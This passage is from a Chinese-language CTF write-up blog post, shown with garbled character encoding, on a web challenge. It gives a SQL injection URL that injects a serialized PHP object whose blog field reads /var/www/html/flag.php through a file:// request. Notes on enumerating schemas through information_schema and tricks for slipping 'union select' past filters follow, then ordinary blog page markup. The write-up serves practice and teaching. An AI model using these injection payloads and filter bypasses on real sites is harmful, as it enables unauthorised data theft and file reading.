æˆ‘ä»¬æ„é€ åºåˆ—åŒ–çš„UserInfoå®ä¾‹ï¼Œblogå†…ä½¿ç”¨file:///è¯»å–æœåŠ¡å™¨ç«¯flag.phpçš„æ–‡æœ¬å†…å®¹

    /view.php?no=-6/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' 
    
ç”¨fileä¼ªåè®®è¯»å–flagå†…å®¹äº¤ç»™blogå‚æ•°ï¼Œç„¶åä½ å†æŸ¥çœ‹æºç ï¼Œiframeçš„srcå°±å‘ç”Ÿäº†å˜åŒ–ï¼Œbase64è§£ç åå¾—åˆ°flagå€¼

å†™åœ¨åé¢ï¼Œå› ä¸ºæ‰‹å·¥sqlæ³¨å…¥ä¸æ˜¯ç‰¹åˆ«çš„ç†Ÿç»ƒï¼Œæ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹ï¼š

    1.çˆ†æ•°æ®åº“ï¼š group_concat(schema_name) from information_schema.schemata

    2.è¡¨å group_concat(table_name) from information_schema.tables where table_schema="å‰é¢æŸ¥å‡ºæ¥çš„"

    3.å­—æ®µ group_concat(column_name) from information_schema.columns where table_schema="å‰é¢æŸ¥å‡ºæ¥çš„"

    4.å†…å®¹ group_concat(xxx) from è¡¨å.å­—æ®µ

ç»•è¿‡union select è¿‡æ»¤æ–¹æ³•ï¼š

    1./**/ union /**/ select

    2.un<>ion sel<>ect

    3. %55NiOn  %53eLEct



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">MambaInVeins</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/">http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://mambainveins.gitee.io/mambainveins" target="_blank">MambaInVeins Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> æ‰“èµ<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_10/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0436.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ xx-xx</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/03/2020/08/2020-08-03-CTF_world_web_advance/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0063.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ 1-10</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_10/" title="CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ xx-xx"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0436.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-04</div><div class="title">CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ xx-xx</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-CTF_world_pwn_newbee_level0/" title="CTFæ”»é˜²ä¸–ç•Œ pwnæ–°æ‰‹é¢˜ level0(ret2text)"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0376.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTFæ”»é˜²ä¸–ç•Œ pwnæ–°æ‰‹é¢˜ level0(ret2text)</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-CTF_world_pwn_newbee_level2/" title="CTFæ”»é˜²ä¸–ç•Œ pwnæ–°æ‰‹é¢˜ level2(ret2libc)"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0304.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTFæ”»é˜²ä¸–ç•Œ pwnæ–°æ‰‹é¢˜ level2(ret2libc)</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-CTF_world_pwn_newbee_when_did_you_born/" title="CTFæ”»é˜²ä¸–ç•Œ pwnæ–°æ‰‹é¢˜ when_did_you_born"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0001.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">CTFæ”»é˜²ä¸–ç•Œ pwnæ–°æ‰‹é¢˜ when_did_you_born</div></div></a></div><div><a href="/2020/08/18/2020/08/2020-08-18-pwn_study/" title="pwnå…¥é—¨"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0046.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-18</div><div class="title">pwnå…¥é—¨</div></div></a></div><div><a href="/2020/08/19/2020/08/2020-08-19-pwntools_install/" title="å®‰è£…pwntools"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0263.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-19</div><div class="title">å®‰è£…pwntools</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">MambaInVeins</div><div class="author-info__description">èº«ä½“å’Œçµé­‚æ€»æœ‰ä¸€ä¸ªåœ¨è·¯ä¸Š</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">248</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">82</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">28</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mambainveins"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mambainveins" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:mambainveins@protonmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>å…¬å‘Š</span></div><div class="announcement_content">æ¬¢è¿æ¥åˆ°æˆ‘çš„å°ç«™ï¼Œåšå®¢æ­£åœ¨è¿ç§»ä¸­ã€‚</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/12/2022/2022-02-12-ubuntu_ssh/" title="ubuntuå¼€å¯sshæœåŠ¡"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0020.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ubuntuå¼€å¯sshæœåŠ¡"/></a><div class="content"><a class="title" href="/2022/02/12/2022/2022-02-12-ubuntu_ssh/" title="ubuntuå¼€å¯sshæœåŠ¡">ubuntuå¼€å¯sshæœåŠ¡</a><time datetime="2022-02-11T16:00:00.000Z" title="å‘è¡¨äº 2022-02-12 00:00:00">2022-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/14/2021/2021-09-14-mi6root/" title="å°ç±³6å®Œå…¨root"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0307.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="å°ç±³6å®Œå…¨root"/></a><div class="content"><a class="title" href="/2021/09/14/2021/2021-09-14-mi6root/" title="å°ç±³6å®Œå…¨root">å°ç±³6å®Œå…¨root</a><time datetime="2021-09-13T16:00:00.000Z" title="å‘è¡¨äº 2021-09-14 00:00:00">2021-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/22/2021/2021-08-22-HWS-2021-shop/" title="HWS-2021-PWN-shop"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0115.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HWS-2021-PWN-shop"/></a><div class="content"><a class="title" href="/2021/08/22/2021/2021-08-22-HWS-2021-shop/" title="HWS-2021-PWN-shop">HWS-2021-PWN-shop</a><time datetime="2021-08-21T16:00:00.000Z" title="å‘è¡¨äº 2021-08-22 00:00:00">2021-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/21/2021/2021-08-21-pwn_patchelf/" title="pwnæ›´æ¢ç›®æ ‡ç¨‹åºlibc â€”â€” patchelfçš„ä½¿ç”¨"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0383.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnæ›´æ¢ç›®æ ‡ç¨‹åºlibc â€”â€” patchelfçš„ä½¿ç”¨"/></a><div class="content"><a class="title" href="/2021/08/21/2021/2021-08-21-pwn_patchelf/" title="pwnæ›´æ¢ç›®æ ‡ç¨‹åºlibc â€”â€” patchelfçš„ä½¿ç”¨">pwnæ›´æ¢ç›®æ ‡ç¨‹åºlibc â€”â€” patchelfçš„ä½¿ç”¨</a><time datetime="2021-08-20T16:00:00.000Z" title="å‘è¡¨äº 2021-08-21 00:00:00">2021-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/15/2021/2021-08-15-HWS_PWN/" title="HWS PWN"><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0077.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HWS PWN"/></a><div class="content"><a class="title" href="/2021/08/15/2021/2021-08-15-HWS_PWN/" title="HWS PWN">HWS PWN</a><time datetime="2021-08-14T16:00:00.000Z" title="å‘è¡¨äº 2021-08-15 00:00:00">2021-08-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By MambaInVeins</div><div class="footer_custom_text"><a href="http://mambainveins.gitee.io/">Mamba Never Out</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="æ”¾å¤§å­—ä½“"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="ç¼©å°å­—ä½“"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script>(function(){
  const bp = document.createElement('script');
  const curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else{
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  bp.dataset.pjax = ''
  const s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})()</script></div></body></html>